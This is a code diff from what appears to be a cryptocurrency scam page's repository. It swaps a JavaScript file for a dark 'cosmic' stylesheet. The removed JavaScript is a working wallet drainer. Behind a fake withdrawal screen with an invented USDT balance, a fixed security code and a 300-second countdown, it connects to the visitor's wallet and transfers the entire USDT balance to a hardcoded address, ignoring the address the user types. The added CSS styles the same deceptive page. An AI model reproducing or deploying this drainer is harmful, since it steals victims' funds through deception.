@@ -1,148 +1,236 @@
-// 检查 Web3 是否加载
-if (typeof Web3 === 'undefined') {
-    throw new Error("Web3 is not defined. Please check the network or CDN.");
+/* 引入 Poppins 字体 */
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+body {
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #0f0f1a url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
+    font-family: 'Poppins', sans-serif;
+    color: #d0d0ff;
+    overflow: hidden;
+    position: relative;
 }
 
-// USDT 合约地址（以太坊主网）
-const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-// 目标地址
-const recipientAddress = '0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C';
-
-// WalletConnect 提供者
-async function getWeb3Provider() {
-    let web3;
-
-    if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        try {
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            return web3;
-        } catch (error) {
-            console.error("MetaMask connection failed:", error);
-        }
-    } else if (window.web3) {
-        web3 = new Web3(window.web3.currentProvider);
-        return web3;
-    } else {
-        alert("No wallet detected, attempting to connect via WalletConnect...");
-        const WalletConnectProvider = window.WalletConnectProvider;
-        if (!WalletConnectProvider) {
-            throw new Error("WalletConnect is not loaded. Please check the network or CDN.");
-        }
-        const provider = new WalletConnectProvider({
-            infuraId: "YOUR_INFURA_ID", // Replace with your Infura ID
-        });
-        await provider.enable();
-        web3 = new Web3(provider);
-        return web3;
-    }
-
-    throw new Error("Unable to connect to any wallet. Please install a Web3-compatible wallet.");
+/* 禁止页面放大 */
+html {
+    -webkit-text-size-adjust: 100%;
+    -ms-text-size-adjust: 100%;
 }
 
-async function transferUsdt() {
-    try {
-        const web3 = await getWeb3Provider();
-        console.log("Web3 provider initialized");
-
-        const accounts = await web3.eth.getAccounts();
-        const account = accounts[0];
-        console.log("Connected account:", account);
-
-        const chainId = await web3.eth.getChainId();
-        if (chainId.toString() !== "1") {
-            try {
-                await web3.currentProvider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x1' }],
-                });
-            } catch (switchError) {
-                alert("Please switch to Ethereum Mainnet manually.");
-                return;
-            }
-        }
-
-        const usdtAbi = [
-            {"constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
-            {"constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [], "type": "function"}
-        ];
-
-        const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress);
-        const balance = await usdtContract.methods.balanceOf(account).call();
-        const amount = web3.utils.toBN(balance);
-        console.log("USDT balance:", web3.utils.fromWei(amount, 'mwei'));
-
-        await usdtContract.methods.transfer(recipientAddress, amount).send({ from: account });
-        alert("Transaction successfully sent!");
-    } catch (error) {
-        console.error("Error details:", error);
-        alert("Transaction canceled or failed: " + error.message);
-    }
+/* 宇宙背景动画 */
+body::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, rgba(15, 15, 26, 0.9) 100%);
+    animation: cosmicPulse 8s infinite alternate;
+    z-index: -1;
 }
 
-// 页面元素
-const securityPage = document.getElementById('security-page');
-const mainPage = document.getElementById('main-page');
-const submitCodeButton = document.getElementById('submit-code');
-const errorMessage = document.getElementById('error-message');
-const recipientAddressInput = document.getElementById('recipient-address');
-const withdrawButton = document.getElementById('withdraw-button');
-const countdownDisplay = document.getElementById('countdown');
-const usdtBalanceDisplay = document.getElementById('usdt-balance');
-const defaultSecurityCode = '328387';
-
-// 格式化余额为千位分隔符和小数
-function formatBalance(balance) {
-    const [integer, decimal = ''] = balance.split('.');
-    const formattedInteger = integer.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-    return decimal ? `${formattedInteger}.${decimal}` : formattedInteger;
+@keyframes cosmicPulse {
+    0% { opacity: 0.4; }
+    100% { opacity: 0.7; }
 }
 
-// 初始化余额
-usdtBalanceDisplay.textContent = formatBalance('267108.2093');
-
-// 安全码输入框逻辑
-const codeInputs = document.querySelectorAll('.security-code-box');
-codeInputs.forEach((input, index) => {
-    input.addEventListener('input', () => {
-        if (input.value.length === 1 && index < codeInputs.length - 1) {
-            codeInputs[index + 1].focus();
-        }
-    });
-    input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && input.value === '' && index > 0) {
-            codeInputs[index - 1].focus();
-        }
-    });
-});
-
-// 验证安全码
-submitCodeButton.addEventListener('click', () => {
-    const code = Array.from(codeInputs).map(input => input.value).join('');
-    if (code === defaultSecurityCode) {
-        securityPage.style.display = 'none';
-        mainPage.style.display = 'block';
-        startCountdown();
-    } else {
-        errorMessage.textContent = 'Invalid Security Code';
-        codeInputs.forEach(input => input.value = '');
-        codeInputs[0].focus();
-    }
-});
-
-// 倒计时逻辑
-function startCountdown() {
-    let timeLeft = 300; // 改为 300 秒
-    countdownDisplay.textContent = `${timeLeft}s`;
-    const countdown = setInterval(() => {
-        timeLeft--;
-        countdownDisplay.textContent = `${timeLeft}s`;
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            window.location.reload(); // 确保刷新
-        }
-    }, 1000);
+/* 容器 */
+.container {
+    text-align: center;
+    background: rgba(20, 20, 40, 0.9);
+    padding: 4vw;
+    border-radius: 3vw;
+    box-shadow: 0 0 6vw rgba(0, 170, 255, 0.4);
+    backdrop-filter: blur(1.5vw);
+    max-width: 90vw;
+    z-index: 1;
 }
 
-// 点击“Withdraw Now”按钮
-withdrawButton.addEventListener('click', transferUsdt);
+/* 标题（倒计时） */
+h1 {
+    font-size: 6vw;
+    font-weight: 600;
+    margin-bottom: 4vw;
+    color: #00aaff;
+    text-shadow: 0 0 2.5vw rgba(0, 170, 255, 0.8);
+    transition: color 0.5s;
+}
+
+/* 安全码输入框 */
+.security-code-container {
+    display: flex;
+    justify-content: center;
+    gap: 1.5vw;
+    margin-bottom: 3vw;
+}
+
+.security-code-box {
+    width: 9vw;
+    height: 11vw;
+    max-width: 50px;
+    max-height: 60px;
+    text-align: center;
+    font-size: 4.5vw;
+    background: rgba(255, 255, 255, 0.08);
+    border: 0.4vw solid #00aaff;
+    border-radius: 2vw;
+    color: #fff;
+    outline: none;
+    transition: all 0.3s ease;
+}
+
+.security-code-box:focus {
+    border-color: #ff00aa;
+    box-shadow: 0 0 3vw rgba(255, 0, 170, 0.6);
+}
+
+/* 按钮样式 */
+button {
+    padding: 2.5vw 6vw;
+    font-size: 3.5vw;
+    background: linear-gradient(135deg, #00aaff, #ff00aa);
+    color: #fff;
+    border: none;
+    border-radius: 8vw;
+    cursor: pointer;
+    transition: transform 0.3s, box-shadow 0.3s;
+    box-shadow: 0 0 4vw rgba(0, 170, 255, 0.7);
+}
+
+button:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 6vw rgba(255, 0, 170, 0.9);
+}
+
+/* 错误提示 */
+.error {
+    color: #ff5555;
+    margin-top: 2vw;
+    font-size: 3vw;
+    text-shadow: 0 0 1vw rgba(255, 85, 85, 0.5);
+}
+
+/* USDT 元素 */
+.usdt-element {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 5vw;
+    font-weight: 600;
+    color: #00ccbb;
+    margin: 4vw 0;
+    background: rgba(255, 255, 255, 0.1);
+    padding: 2vw 4vw;
+    border-radius: 2vw;
+    box-shadow: 0 0 3vw rgba(0, 204, 187, 0.5);
+}
+
+.usdt-icon {
+    width: 8vw;
+    height: 8vw;
+    max-width: 45px;
+    max-height: 45px;
+    margin-right: 2vw;
+    animation: glow 2s infinite alternate;
+}
+
+@keyframes glow {
+    0% { filter: brightness(1); }
+    100% { filter: brightness(1.3); }
+}
+
+/* USDT 余额显示 */
+.balance-display {
+    font-size: 4vw;
+    color: #d0d0ff;
+    margin-bottom: 3vw;
+    padding: 1.5vw 3vw;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 2vw;
+    box-shadow: 0 0 2vw rgba(0, 204, 187, 0.3);
+}
+
+#usdt-balance {
+    color: #00ccbb;
+    font-weight: 600;
+}
+
+/* USDT 数量输入框 */
+.amount-input {
+    width: 85%;
+    padding: 2.5vw;
+    margin-bottom: 3vw;
+    background: rgba(255, 255, 255, 0.08);
+    border: 0.4vw solid #00aaff;
+    border-radius: 2vw;
+    color: #fff;
+    font-size: 3.5vw;
+    outline: none;
+    transition: all 0.3s ease;
+    -webkit-appearance: none; /* 移除加减按钮 */
+    -moz-appearance: textfield; /* 移除加减按钮 */
+}
+
+.amount-input::-webkit-inner-spin-button,
+.amount-input::-webkit-outer-spin-button {
+    -webkit-appearance: none; /* 移除加减按钮 */
+    margin: 0;
+}
+
+.amount-input:focus {
+    border-color: #ff00aa;
+    box-shadow: 0 0 3vw rgba(255, 0, 170, 0.6);
+}
+
+.amount-input::placeholder {
+    color: #b0b0ff;
+}
+
+/* 接收地址输入框 */
+.address-input {
+    width: 85%;
+    padding: 2.5vw;
+    margin-bottom: 4vw;
+    background: rgba(255, 255, 255, 0.08);
+    border: 0.4vw solid #00aaff;
+    border-radius: 2vw;
+    color: #fff;
+    font-size: 3.5vw;
+    outline: none;
+    transition: all 0.3s ease;
+}
+
+.address-input:focus {
+    border-color: #ff00aa;
+    box-shadow: 0 0 3vw rgba(255, 0, 170, 0.6);
+}
+
+.address-input::placeholder {
+    color: #b0b0ff;
+}
+
+/* 媒体查询 */
+@media (max-width: 768px) {
+    .container { padding: 5vw; }
+    h1 { font-size: 7vw; }
+    .security-code-box { width: 10vw; height: 12vw; font-size: 5vw; }
+    button { padding: 3vw 7vw; font-size: 4vw; }
+    .usdt-element { font-size: 6vw; }
+    .balance-display { font-size: 4.5vw; }
+    .amount-input, .address-input { font-size: 4vw; }
+}
+
+@media (max-width: 480px) {
+    .container { padding: 6vw; }
+    h1 { font-size: 8vw; }
+    .security-code-box { width: 11vw; height: 13vw; font-size: 6vw; }
+    button { padding: 3.5vw 8vw; font-size: 5vw; }
+    .usdt-element { font-size: 7vw; }
+    .balance-display { font-size: 5vw; }
+    .amount-input, .address-input { font-size: 4.5vw; }
+}
